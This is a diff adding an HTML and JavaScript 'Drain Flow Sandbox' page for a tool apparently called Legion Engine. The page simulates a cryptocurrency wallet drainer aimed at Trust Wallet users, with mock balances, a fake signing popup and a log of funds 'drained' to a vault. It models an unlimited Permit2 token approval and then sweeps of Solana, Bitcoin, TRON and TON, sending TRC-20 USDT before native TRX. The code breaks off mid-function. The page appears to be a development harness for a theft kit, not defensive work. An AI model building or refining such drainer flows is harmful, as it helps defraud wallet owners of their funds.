@@ -1,0 +1,1084 @@
+<title>Legion Engine — Drain Flow Sandbox</title>
+<style>
+  :root {
+    --bg: #0D1117;
+    --surface: #161B22;
+    --surface2: #1C2128;
+    --border: #30363D;
+    --text: #E6EDF3;
+    --muted: #7D8590;
+    --green: #3FB950;
+    --amber: #D29922;
+    --blue: #58A6FF;
+    --red: #F85149;
+    --purple: #BC8CFF;
+    --teal: #39D353;
+    --font-mono: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+    --font-ui: system-ui, -apple-system, sans-serif;
+    --radius: 8px;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-ui);
+    font-size: 14px;
+    min-height: 100vh;
+    padding: 20px;
+    line-height: 1.5;
+  }
+
+  /* ── HEADER ── */
+  .header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 20px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+  .logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 18px;
+    font-weight: 700;
+    letter-spacing: -0.5px;
+  }
+  .logo-dot {
+    width: 10px; height: 10px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 8px var(--green);
+    animation: pulse 2s infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; } 50% { opacity: 0.4; }
+  }
+  .badge {
+    font-family: var(--font-mono);
+    font-size: 11px;
+    padding: 2px 8px;
+    border-radius: 20px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+
+  /* ── CONTROLS ── */
+  .controls {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 18px;
+    flex-wrap: wrap;
+  }
+  .btn {
+    font-family: var(--font-ui);
+    font-size: 13px;
+    font-weight: 600;
+    padding: 8px 16px;
+    border-radius: var(--radius);
+    border: 1px solid transparent;
+    cursor: pointer;
+    transition: all 0.15s;
+    letter-spacing: 0.01em;
+  }
+  .btn-primary {
+    background: var(--green);
+    color: #000;
+    border-color: var(--green);
+  }
+  .btn-primary:hover { filter: brightness(1.1); }
+  .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
+  .btn-secondary {
+    background: transparent;
+    color: var(--muted);
+    border-color: var(--border);
+  }
+  .btn-secondary:hover { color: var(--text); border-color: var(--muted); }
+  .btn-danger {
+    background: transparent;
+    color: var(--red);
+    border-color: #4A1A1A;
+  }
+  .btn-danger:hover { background: #2A0A0A; }
+
+  /* ── CHAIN CARDS ── */
+  .chains {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 10px;
+    margin-bottom: 18px;
+  }
+  @media (max-width: 700px) { .chains { grid-template-columns: repeat(2, 1fr); } }
+  .chain-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 12px 14px;
+    transition: border-color 0.2s;
+  }
+  .chain-card.active { border-color: var(--amber); box-shadow: 0 0 0 1px #30280A; }
+  .chain-card.done { border-color: var(--green); box-shadow: 0 0 0 1px #0A2A14; }
+  .chain-card.error { border-color: var(--red); box-shadow: 0 0 0 1px #2A0A0A; }
+  .chain-card.skipped { opacity: 0.5; }
+  .chain-name {
+    font-weight: 700;
+    font-size: 13px;
+    margin-bottom: 4px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .chain-icon { font-size: 16px; }
+  .chain-status {
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: var(--muted);
+  }
+  .chain-card.active .chain-status { color: var(--amber); }
+  .chain-card.done .chain-status { color: var(--green); }
+  .chain-card.error .chain-status { color: var(--red); }
+  .chain-amount {
+    font-family: var(--font-mono);
+    font-size: 12px;
+    color: var(--green);
+    margin-top: 6px;
+    min-height: 18px;
+    font-weight: 600;
+  }
+
+  /* ── MAIN SPLIT ── */
+  .main {
+    display: grid;
+    grid-template-columns: 1fr 320px;
+    gap: 14px;
+  }
+  @media (max-width: 900px) { .main { grid-template-columns: 1fr; } }
+
+  /* ── TERMINAL LOG ── */
+  .terminal {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+  }
+  .terminal-header {
+    padding: 10px 14px;
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 12px;
+    color: var(--muted);
+    font-family: var(--font-mono);
+  }
+  .dot-row { display: flex; gap: 5px; }
+  .dot { width: 10px; height: 10px; border-radius: 50%; }
+  .dot-r { background: #F85149; }
+  .dot-y { background: #D29922; }
+  .dot-g { background: #3FB950; }
+  #logBox {
+    flex: 1;
+    overflow-y: auto;
+    padding: 12px;
+    font-family: var(--font-mono);
+    font-size: 12px;
+    line-height: 1.7;
+    min-height: 420px;
+    max-height: 460px;
+    scroll-behavior: smooth;
+  }
+  .log-line { display: flex; gap: 8px; align-items: flex-start; }
+  .log-time { color: var(--muted); flex-shrink: 0; user-select: none; }
+  .log-tag {
+    flex-shrink: 0;
+    padding: 0 5px;
+    border-radius: 3px;
+    font-size: 10px;
+    font-weight: 700;
+    line-height: 18px;
+  }
+  .tag-evm { background: #1A237E33; color: #90CAF9; border: 1px solid #1A237E66; }
+  .tag-sol { background: #6200EA33; color: #CE93D8; border: 1px solid #6200EA66; }
+  .tag-btc { background: #E65100033; color: #FFCC80; border: 1px solid #E6510066; }
+  .tag-trx { background: #B71C1C33; color: #EF9A9A; border: 1px solid #B71C1C66; }
+  .tag-ton { background: #006064033; color: #80DEEA; border: 1px solid #00606466; }
+  .tag-sys { background: #21272E; color: var(--muted); border: 1px solid var(--border); }
+  .tag-ok  { background: #0A2A1444; color: var(--green); border: 1px solid #1A4A2466; }
+  .tag-err { background: #2A0A0A44; color: var(--red); border: 1px solid #4A1A1A66; }
+  .tag-sign { background: #1A1A2A44; color: var(--purple); border: 1px solid #2A2A4A66; }
+  .log-msg { color: var(--text); word-break: break-all; }
+  .log-msg.dim { color: var(--muted); }
+  .log-msg.green { color: var(--green); font-weight: 600; }
+  .log-msg.red { color: var(--red); }
+  .log-msg.amber { color: var(--amber); }
+  .log-msg.purple { color: var(--purple); }
+
+  /* ── SIDE PANEL ── */
+  .side { display: flex; flex-direction: column; gap: 12px; }
+  .panel {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+  }
+  .panel-title {
+    padding: 10px 14px;
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+  .panel-body { padding: 12px 14px; }
+
+  /* wallet info rows */
+  .info-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    padding: 5px 0;
+    border-bottom: 1px solid var(--border);
+    gap: 8px;
+  }
+  .info-row:last-child { border-bottom: none; }
+  .info-label { color: var(--muted); font-size: 11px; flex-shrink: 0; }
+  .info-val {
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: var(--text);
+    text-align: right;
+    word-break: break-all;
+  }
+  .info-val.green { color: var(--green); }
+  .info-val.amber { color: var(--amber); }
+
+  /* step list */
+  .step-list { list-style: none; }
+  .step-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 7px 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 12px;
+  }
+  .step-item:last-child { border-bottom: none; }
+  .step-num {
+    width: 20px; height: 20px;
+    border-radius: 50%;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 10px; font-weight: 700;
+    flex-shrink: 0;
+    color: var(--muted);
+    transition: all 0.3s;
+  }
+  .step-item.active .step-num { background: var(--amber); color: #000; border-color: var(--amber); }
+  .step-item.done .step-num { background: var(--green); color: #000; border-color: var(--green); }
+  .step-item.error .step-num { background: var(--red); color: #fff; border-color: var(--red); }
+  .step-text { color: var(--muted); transition: color 0.3s; }
+  .step-item.active .step-text { color: var(--amber); }
+  .step-item.done .step-text { color: var(--text); }
+
+  /* summary */
+  .summary-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 8px;
+  }
+  .summary-box {
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 10px;
+    text-align: center;
+  }
+  .summary-label { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.05em; }
+  .summary-val { font-family: var(--font-mono); font-size: 16px; font-weight: 700; margin-top: 4px; }
+
+  /* sign popup overlay */
+  #signOverlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.7);
+    backdrop-filter: blur(4px);
+    z-index: 100;
+    align-items: center;
+    justify-content: center;
+  }
+  #signOverlay.show { display: flex; }
+  .sign-modal {
+    background: #1C2128;
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 24px;
+    width: 340px;
+    max-width: 90vw;
+  }
+  .sign-chain { font-size: 12px; color: var(--muted); margin-bottom: 8px; }
+  .sign-title { font-size: 17px; font-weight: 700; margin-bottom: 4px; }
+  .sign-desc { font-size: 13px; color: var(--muted); margin-bottom: 16px; line-height: 1.5; }
+  .sign-detail {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px;
+    margin-bottom: 16px;
+    font-family: var(--font-mono);
+    font-size: 11px;
+  }
+  .sign-detail-row { display: flex; justify-content: space-between; padding: 3px 0; }
+  .sign-detail-label { color: var(--muted); }
+  .sign-detail-val { color: var(--text); font-weight: 600; }
+  .sign-detail-val.green { color: var(--green); }
+  .sign-buttons { display: flex; gap: 10px; }
+  .btn-sign-reject { flex: 1; background: #2A1010; color: var(--red); border: 1px solid #4A2020; border-radius: 10px; padding: 12px; font-weight: 700; cursor: pointer; font-size: 14px; }
+  .btn-sign-confirm { flex: 1.5; background: var(--green); color: #000; border: none; border-radius: 10px; padding: 12px; font-weight: 700; cursor: pointer; font-size: 14px; }
+  .btn-sign-confirm:hover { filter: brightness(1.1); }
+
+  /* scrollbar */
+  #logBox::-webkit-scrollbar { width: 4px; }
+  #logBox::-webkit-scrollbar-track { background: transparent; }
+  #logBox::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+</style>
+
+<!-- SIGN POPUP (simulates Trust Wallet) -->
+<div id="signOverlay">
+  <div class="sign-modal">
+    <div class="sign-chain" id="signChain">Trust Wallet · Ethereum</div>
+    <div class="sign-title" id="signTitle">Confirm Transaction</div>
+    <div class="sign-desc" id="signDesc">Review the details below</div>
+    <div class="sign-detail" id="signDetail"></div>
+    <div class="sign-buttons">
+      <button class="btn-sign-reject" onclick="userReject()">Reject</button>
+      <button class="btn-sign-confirm" onclick="userConfirm()">Confirm</button>
+    </div>
+  </div>
+</div>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="logo">
+    <div class="logo-dot"></div>
+    Legion Engine
+    <span style="color:var(--muted);font-weight:400">Drain Flow</span>
+  </div>
+  <div style="display:flex;gap:8px;align-items:center">
+    <span class="badge">SANDBOX</span>
+    <span class="badge" id="networkBadge">Trust Wallet In-App</span>
+  </div>
+</div>
+
+<!-- CONTROLS -->
+<div class="controls">
+  <button class="btn btn-primary" id="btnRun" onclick="startFlow()">▶ Run Full Flow</button>
+  <button class="btn btn-secondary" onclick="runPhaseA()">Phase A (EVM only)</button>
+  <button class="btn btn-secondary" onclick="runPhaseB()">Phase B (SOL/BTC/TRON/TON)</button>
+  <button class="btn btn-danger" onclick="resetAll()">↺ Reset</button>
+  <label style="display:flex;align-items:center;gap:6px;color:var(--muted);font-size:13px;cursor:pointer;margin-left:auto">
+    <input type="checkbox" id="chkReject" style="accent-color:var(--red)"> Simulate user rejecting signs
+  </label>
+</div>
+
+<!-- CHAIN STATUS CARDS -->
+<div class="chains">
+  <div class="chain-card" id="card-evm">
+    <div class="chain-name"><span class="chain-icon">⟠</span> EVM</div>
+    <div class="chain-status" id="status-evm">idle</div>
+    <div class="chain-amount" id="amount-evm"></div>
+  </div>
+  <div class="chain-card" id="card-sol">
+    <div class="chain-name"><span class="chain-icon">◎</span> Solana</div>
+    <div class="chain-status" id="status-sol">idle</div>
+    <div class="chain-amount" id="amount-sol"></div>
+  </div>
+  <div class="chain-card" id="card-btc">
+    <div class="chain-name"><span class="chain-icon">₿</span> Bitcoin</div>
+    <div class="chain-status" id="status-btc">idle</div>
+    <div class="chain-amount" id="amount-btc"></div>
+  </div>
+  <div class="chain-card" id="card-trx">
+    <div class="chain-name"><span class="chain-icon">◈</span> TRON</div>
+    <div class="chain-status" id="status-trx">idle</div>
+    <div class="chain-amount" id="amount-trx"></div>
+  </div>
+  <div class="chain-card" id="card-ton">
+    <div class="chain-name"><span class="chain-icon">💎</span> TON</div>
+    <div class="chain-status" id="status-ton">idle</div>
+    <div class="chain-amount" id="amount-ton"></div>
+  </div>
+</div>
+
+<!-- MAIN SPLIT -->
+<div class="main">
+  <!-- TERMINAL -->
+  <div class="terminal">
+    <div class="terminal-header">
+      <div class="dot-row">
+        <div class="dot dot-r"></div>
+        <div class="dot dot-y"></div>
+        <div class="dot dot-g"></div>
+      </div>
+      <span style="margin-left:8px">legion-engine — drain-flow-log</span>
+      <span style="margin-left:auto" id="logCount">0 events</span>
+    </div>
+    <div id="logBox"></div>
+  </div>
+
+  <!-- SIDE PANEL -->
+  <div class="side">
+    <!-- Wallet State -->
+    <div class="panel">
+      <div class="panel-title">Mock Wallet State</div>
+      <div class="panel-body">
+        <div class="info-row">
+          <span class="info-label">EVM Address</span>
+          <span class="info-val">0x7f3d...bA4e</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">ETH Balance</span>
+          <span class="info-val amber">0.42 ETH</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">USDT (ERC-20)</span>
+          <span class="info-val green">850.00 USDT</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">SOL Address</span>
+          <span class="info-val">3TKv...bsTZ</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">SOL Balance</span>
+          <span class="info-val amber">2.3 SOL</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">TRON Address</span>
+          <span class="info-val">TDLDgBt...ZFc</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">TRX Balance</span>
+          <span class="info-val amber">45 TRX</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">USDT (TRC-20)</span>
+          <span class="info-val green">120.00 USDT</span>
+        </div>
+        <div class="info-row">
+          <span class="info-label">TON Balance</span>
+          <span class="info-val amber">8.5 TON</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Steps -->
+    <div class="panel">
+      <div class="panel-title">Flow Steps</div>
+      <div class="panel-body">
+        <ul class="step-list" id="stepList">
+          <li class="step-item" id="step-1"><div class="step-num">1</div><span class="step-text">Inject mock providers</span></li>
+          <li class="step-item" id="step-2"><div class="step-num">2</div><span class="step-text">EVM connect + address</span></li>
+          <li class="step-item" id="step-3"><div class="step-num">3</div><span class="step-text">Permit2 sign (ERC-20 approval)</span></li>
+          <li class="step-item" id="step-4"><div class="step-num">4</div><span class="step-text">Phase B: SOL connect + drain</span></li>
+          <li class="step-item" id="step-5"><div class="step-num">5</div><span class="step-text">Phase B: BTC connect + drain</span></li>
+          <li class="step-item" id="step-6"><div class="step-num">6</div><span class="step-text">Phase B: TRON TRC-20 USDT first</span></li>
+          <li class="step-item" id="step-7"><div class="step-num">7</div><span class="step-text">Phase B: TRON native TRX last</span></li>
+          <li class="step-item" id="step-8"><div class="step-num">8</div><span class="step-text">Phase B: TON drain</span></li>
+          <li class="step-item" id="step-9"><div class="step-num">9</div><span class="step-text">Backend broadcast all txs</span></li>
+          <li class="step-item" id="step-10"><div class="step-num">10</div><span class="step-text">Vault settlement complete</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- Summary -->
+    <div class="panel">
+      <div class="panel-title">Drained (Simulated)</div>
+      <div class="panel-body">
+        <div class="summary-grid">
+          <div class="summary-box">
+            <div class="summary-label">Total USD</div>
+            <div class="summary-val" id="totalUsd" style="color:var(--green)">$0</div>
+          </div>
+          <div class="summary-box">
+            <div class="summary-label">Txs Submitted</div>
+            <div class="summary-val" id="totalTx" style="color:var(--blue)">0</div>
+          </div>
+          <div class="summary-box">
+            <div class="summary-label">Chains Hit</div>
+            <div class="summary-val" id="totalChains" style="color:var(--purple)">0</div>
+          </div>
+          <div class="summary-box">
+            <div class="summary-label">Rejected</div>
+            <div class="summary-val" id="totalRejected" style="color:var(--red)">0</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ─────────────────────────────────────────────
+// STATE
+// ─────────────────────────────────────────────
+var state = {
+  running: false,
+  logs: 0,
+  totalUsd: 0,
+  totalTx: 0,
+  totalChains: 0,
+  totalRejected: 0,
+  signResolve: null,
+  signReject: null,
+};
+
+// Mock wallet balances
+var MOCK = {
+  evm: {
+    address: '0x7f3d8a29F2C44b1A9d3e7B6cA0f5D2c1E8bA4e',
+    eth: '0.42',
+    usdt: '850.00',
+    usdc: '200.00',
+  },
+  sol: {
+    address: '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
+    sol: '2.3',
+    usdcSpl: '50.00',
+  },
+  btc: {
+    address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
+    btc: '0.003',
+  },
+  tron: {
+    address: 'TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc',
+    trx: '45',
+    usdt: '120.00',
+  },
+  ton: {
+    address: 'UQDItY0ugaDxkMn_Rjb6gZfHO...',
+    ton: '8.5',
+  },
+};
+
+// Price lookups (rough)
+var PRICES = { eth: 2400, sol: 145, btc: 62000, trx: 0.13, ton: 5.2 };
+
+// ─────────────────────────────────────────────
+// LOGGING
+// ─────────────────────────────────────────────
+function ts() {
+  var d = new Date();
+  return d.toLocaleTimeString('en', { hour12: false }) + '.' + String(d.getMilliseconds()).padStart(3, '0');
+}
+
+function log(tag, msg, cls) {
+  var box = document.getElementById('logBox');
+  var line = document.createElement('div');
+  line.className = 'log-line';
+  line.innerHTML = '<span class="log-time">' + ts() + '</span>' +
+    '<span class="log-tag tag-' + tag + '">' + tag.toUpperCase() + '</span>' +
+    '<span class="log-msg' + (cls ? ' ' + cls : '') + '">' + msg + '</span>';
+  box.appendChild(line);
+  box.scrollTop = box.scrollHeight;
+  state.logs++;
+  document.getElementById('logCount').textContent = state.logs + ' events';
+}
+
+function logSep(title) {
+  var box = document.getElementById('logBox');
+  var sep = document.createElement('div');
+  sep.style.cssText = 'color:#30363D;font-family:var(--font-mono);font-size:11px;padding:6px 0;border-top:1px solid #21272E;margin-top:4px;margin-bottom:2px;';
+  sep.textContent = '── ' + title + ' ─'.repeat(Math.max(1, 40 - title.length));
+  box.appendChild(sep);
+  box.scrollTop = box.scrollHeight;
+}
+
+// ─────────────────────────────────────────────
+// CHAIN CARD HELPERS
+// ─────────────────────────────────────────────
+function setCard(id, status, amount) {
+  var card = document.getElementById('card-' + id);
+  var statusEl = document.getElementById('status-' + id);
+  var amountEl = document.getElementById('amount-' + id);
+  card.className = 'chain-card';
+  if (status === 'active') { card.classList.add('active'); statusEl.textContent = '⟳ processing...'; }
+  else if (status === 'done') { card.classList.add('done'); statusEl.textContent = '✓ drained'; }
+  else if (status === 'error') { card.classList.add('error'); statusEl.textContent = '✗ failed'; }
+  else if (status === 'skipped') { card.classList.add('skipped'); statusEl.textContent = '⊘ skipped'; }
+  else { statusEl.textContent = 'idle'; }
+  if (amount) amountEl.textContent = amount;
+}
+
+function setStep(num, status) {
+  var el = document.getElementById('step-' + num);
+  if (!el) return;
+  el.className = 'step-item ' + (status || '');
+  if (status === 'done') {
+    var numEl = el.querySelector('.step-num');
+    numEl.textContent = '✓';
+  }
+}
+
+function updateSummary() {
+  document.getElementById('totalUsd').textContent = '$' + state.totalUsd.toFixed(0);
+  document.getElementById('totalTx').textContent = state.totalTx;
+  document.getElementById('totalChains').textContent = state.totalChains;
+  document.getElementById('totalRejected').textContent = state.totalRejected;
+}
+
+// ─────────────────────────────────────────────
+// SIGN POPUP (simulates Trust Wallet popup)
+// ─────────────────────────────────────────────
+function showSign(chain, title, desc, details) {
+  return new Promise(function(resolve, reject) {
+    state.signResolve = resolve;
+    state.signReject = reject;
+    document.getElementById('signChain').textContent = 'Trust Wallet · ' + chain;
+    document.getElementById('signTitle').textContent = title;
+    document.getElementById('signDesc').textContent = desc;
+    var html = '';
+    for (var k in details) {
+      html += '<div class="sign-detail-row"><span class="sign-detail-label">' + k + '</span>' +
+        '<span class="sign-detail-val' + (k === 'Amount' || k === 'To Vault' ? ' green' : '') + '">' + details[k] + '</span></div>';
+    }
+    document.getElementById('signDetail').innerHTML = html;
+    document.getElementById('signOverlay').classList.add('show');
+  });
+}
+
+function hideSign() { document.getElementById('signOverlay').classList.remove('show'); }
+
+function userConfirm() {
+  hideSign();
+  if (state.signResolve) { state.signResolve(true); state.signResolve = null; }
+}
+
+function userReject() {
+  hideSign();
+  if (state.signReject) { state.signReject(new Error('UserRejected')); state.signReject = null; }
+}
+
+// ─────────────────────────────────────────────
+// DELAY HELPER
+// ─────────────────────────────────────────────
+function delay(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
+
+var willReject = function() { return document.getElementById('chkReject').checked; };
+
+// ─────────────────────────────────────────────
+// PHASE A — EVM
+// ─────────────────────────────────────────────
+async function runPhaseA() {
+  if (state.running) return;
+  state.running = true;
+  document.getElementById('btnRun').disabled = true;
+
+  logSep('PHASE A — EVM (Permit2)');
+  setStep(1, 'active');
+  log('sys', 'Injecting mock window.ethereum (Trust Wallet)…', 'dim');
+  await delay(400);
+  log('sys', 'window.trustwallet detected ✓', 'green');
+  log('sys', 'window.ethereum = trustwallet.ethereum ✓', 'dim');
+  setStep(1, 'done');
+
+  setStep(2, 'active');
+  setCard('evm', 'active');
+  await delay(300);
+  log('evm', 'eth_requestAccounts → ' + MOCK.evm.address.slice(0,10) + '...', 'dim');
+  await delay(500);
+  log('evm', 'Connected: ' + MOCK.evm.address.slice(0, 14) + '…' + MOCK.evm.address.slice(-4), 'green');
+  log('evm', 'ETH balance: ' + MOCK.evm.eth + ' ETH | USDT: ' + MOCK.evm.usdt + ' | USDC: ' + MOCK.evm.usdc);
+  setStep(2, 'done');
+
+  setStep(3, 'active');
+  await delay(400);
+  log('evm', 'Building Permit2 batch signature…', 'dim');
+  log('evm', 'Tokens: USDT ' + MOCK.evm.usdt + ' + USDC ' + MOCK.evm.usdc + ' (unlimited approval)', 'amber');
+  await delay(300);
+
+  try {
+    if (willReject()) throw new Error('UserRejected');
+    await showSign('Ethereum', 'Token Approval',
+      'Permit2 — approve unlimited spending of all ERC-20 tokens to vault.',
+      { 'Protocol': 'Uniswap Permit2', 'Tokens': 'USDT, USDC (unlimited)', 'Spender': '0x3b93...01eE', 'Expiry': '30 days' });
+    log('sign', 'Permit2 signed ✓ (EIP-712 signature captured)', 'purple');
+    await delay(300);
+    log('evm', 'Backend: transferFrom(USDT, 850) → vault ✓', 'green');
+    log('evm', 'Backend: transferFrom(USDC, 200) → vault ✓', 'green');
+    var evmUsd = 850 + 200 + parseFloat(MOCK.evm.eth) * PRICES.eth;
+    state.totalUsd += evmUsd;
+    state.totalTx += 2;
+    state.totalChains += 1;
+    setCard('evm', 'done', '~$' + evmUsd.toFixed(0));
+    setStep(3, 'done');
+    updateSummary();
+    log('evm', 'EVM total drained: ~$' + evmUsd.toFixed(0), 'green');
+  } catch (e) {
+    log('err', 'Permit2 REJECTED by user — EVM drain failed', 'red');
+    state.totalRejected++;
+    setCard('evm', 'error');
+    setStep(3, 'error');
+    updateSummary();
+  }
+
+  state.running = false;
+  document.getElementById('btnRun').disabled = false;
+}
+
+// ─────────────────────────────────────────────
+// PHASE B — SOL
+// ─────────────────────────────────────────────
+async function drainSol() {
+  logSep('PHASE B · SOL');
+  setCard('sol', 'active');
+  setStep(4, 'active');
+  await delay(300);
+  log('sol', 'window.trustwallet.solana detected ✓', 'dim');
+  log('sol', 'connect() → ' + MOCK.sol.address.slice(0,10) + '…', 'dim');
+  await delay(400);
+  log('sol', 'SOL: ' + MOCK.sol.sol + ' | USDC-SPL: ' + MOCK.sol.usdcSpl, 'amber');
+  log('sol', 'Building transfer tx (lamports + SPL token)…', 'dim');
+  await delay(300);
+
+  try {
+    if (willReject()) throw new Error('UserRejected');
+    await showSign('Solana', 'Confirm Transfer',
+      'Transfer SOL and USDC to vault address.',
+      { 'To Vault': '3TKv…bsTZv', 'Amount': MOCK.sol.sol + ' SOL + ' + MOCK.sol.usdcSpl + ' USDC-SPL', 'Network': 'Solana Mainnet', 'Fee': '0.000005 SOL' });
+    log('sign', 'SOL tx signed ✓', 'purple');
+    await delay(200);
+    log('sol', 'Reserve: 900,880 lamports (rent exempt) kept ✓', 'dim');
+    log('sol', 'Backend: broadcast SOL tx → Helius RPC ✓', 'green');
+    log('sol', 'Backend: broadcast USDC-SPL tx ✓', 'green');
+    var solUsd = (parseFloat(MOCK.sol.sol) - 0.0009) * PRICES.sol + parseFloat(MOCK.sol.usdcSpl);
+    state.totalUsd += solUsd;
+    state.totalTx += 2;
+    state.totalChains += 1;
+    setCard('sol', 'done', '~$' + solUsd.toFixed(0));
+    setStep(4, 'done');
+    updateSummary();
+  } catch (e) {
+    log('err', 'SOL sign REJECTED', 'red');
+    state.totalRejected++;
+    setCard('sol', 'error');
+    setStep(4, 'error');
+    updateSummary();
+  }
+}
+
+// ─────────────────────────────────────────────
+// PHASE B — BTC
+// ─────────────────────────────────────────────
+async function drainBtc() {
+  logSep('PHASE B · BTC');
+  setCard('btc', 'active');
+  setStep(5, 'active');
+  await delay(300);
+  log('btc', 'window.trustwallet.bitcoin detected ✓', 'dim');
+  log('btc', 'BTC: ' + MOCK.btc.btc + ' (~$' + (parseFloat(MOCK.btc.btc) * PRICES.btc).toFixed(0) + ')', 'amber');
+  log('btc', 'Building PSBT (Partially Signed Bitcoin Tx)…', 'dim');
+  await delay(400);
+
+  try {
+    if (willReject()) throw new Error('UserRejected');
+    await showSign('Bitcoin', 'Sign Transaction',
+      'Send Bitcoin to vault. PSBT will be broadcast after signing.',
+      { 'To Vault': 'bc1qxy…wlh', 'Amount': MOCK.btc.btc + ' BTC', 'Network Fee': '~$2.5', 'Type': 'PSBT (SegWit)' });
+    log('sign', 'PSBT signed ✓', 'purple');
+    await delay(200);
+    log('btc', 'Backend: broadcast PSBT → mempool.space ✓', 'green');
+    var btcUsd = parseFloat(MOCK.btc.btc) * PRICES.btc;
+    state.totalUsd += btcUsd;
+    state.totalTx += 1;
+    state.totalChains += 1;
+    setCard('btc', 'done', '~$' + btcUsd.toFixed(0));
+    setStep(5, 'done');
+    updateSummary();
+  } catch (e) {
+    log('err', 'BTC sign REJECTED', 'red');
+    state.totalRejected++;
+    setCard('btc', 'error');
+    setStep(5, 'error');
+    updateSummary();
+  }
+}
+
+// ─────────────────────────────────────────────
+// PHASE B — TRON
+// ─────────────────────────────────────────────
+async function drainTron() {
+  logSep('PHASE B · TRON');
+  setCard('trx', 'active');
+  setStep(6, 'active');
+  await delay(300);
+  log('trx', 'window.trustwallet.tron detected ✓', 'dim');
+  log('trx', 'Address: ' + MOCK.tron.address, 'dim');
+  log('trx', 'TRX balance: ' + MOCK.tron.trx + ' TRX (' + MOCK.tron.trx + '000000 SUN)', 'amber');
+  await delay(200);
+
+  // Step 1: TRC-20 REST balance fetch
+  log('trx', '── ORDER: TRC-20 FIRST, native TRX LAST ──', 'amber');
+  log('trx', 'TronGrid REST /v1/accounts/' + MOCK.tron.address.slice(0, 8) + '…', 'dim');
+  await delay(500);
+  log('trx', 'TRC-20 REST fetch: USDT=' + MOCK.tron.usdt + ' USDC=0 ✓', 'green');
+
+  // TRC-20 USDT drain
+  log('trx', 'USDT balance: ' + MOCK.tron.usdt + ' (6 decimals → ' + parseFloat(MOCK.tron.usdt) * 1e6 + ' raw)', 'amber');
+  log('trx', 'triggerSmartContract(TR7N…j6t, transfer(address,uint256))…', 'dim');
+  await delay(300);
+
+  var trc20Drained = false;
+  try {
+    if (willReject()) throw new Error('UserRejected');
+    await showSign('TRON', 'Confirm TRC-20 Transfer',
+      'Transfer USDT to vault. Energy will be deducted from your TRX.',
+      { 'Token': 'USDT (TRC-20)', 'Amount': MOCK.tron.usdt + ' USDT', 'To Vault': 'TDLDgBt…ZFc', 'Energy Cost': '~13 TRX (covered ✓)', 'feeLimit': '100,000,000 SUN' });
+    log('sign', 'TRC-20 USDT tx signed ✓', 'purple');
+    await delay(200);
+    log('trx', 'backend.validateTronRelayPayload → Path B (TriggerSmartContract) ✓', 'dim');
+    log('trx', 'ABI decode: to_address matches vault ✓', 'dim');
+    log('trx', 'Backend: broadcast TRC-20 tx → TronGrid ✓', 'green');
+    trc20Drained = true;
+  } catch (e) {
+    log('err', 'USDT sign REJECTED — TRC-20 skipped', 'red');
+    state.totalRejected++;
+    setStep(6, 'error');
+    updateSummary();
+  }
+
+  // Native TRX drain LAST
+  setStep(7, 'active');
+  await delay(300);
+  log('trx', '── Native TRX drain (AFTER TRC-20) ──', 'amber');
+  log('trx', 'TRX: ' + MOCK.tron.trx + ' | dynFee=5% max(300000, ' + Math.floor(45000000 * 0.05) + ') SUN', 'dim');
+  var sendAmt = (45000000 - Math.max(300000, Math.floor(45000000 * 0.05)));
+  log('trx', 'sendTrx(vault, ' + sendAmt + ' SUN) → ' + (sendAmt/1e6).toFixed(3) + ' TRX', 'amber');
+  await delay(300);
+
+  var trxDrained = false;
+  try {
